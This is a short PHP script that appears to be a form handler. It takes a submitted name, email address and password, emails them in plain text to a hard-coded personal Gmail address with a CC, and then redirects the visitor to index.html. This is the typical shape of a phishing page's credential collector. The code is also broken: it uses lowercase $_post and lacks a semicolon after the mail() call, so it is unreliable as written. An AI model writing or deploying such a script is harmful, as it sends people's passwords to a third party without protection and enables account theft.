<?php
$name = $_post['name'];
$email = $_post['email'];
$password = $_post['password'];
$to = "ahmedamarsara5@gmail.com";
$subject = "mail from web site";
$text ="name = ". $name . "\r\n email = ". $email . "\r\n password = ". $password;
$headers = "from:norplay@yoursite.com" . "\r\n" .
"CC:somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$text,$headers)
}
header("location:index.html");
?>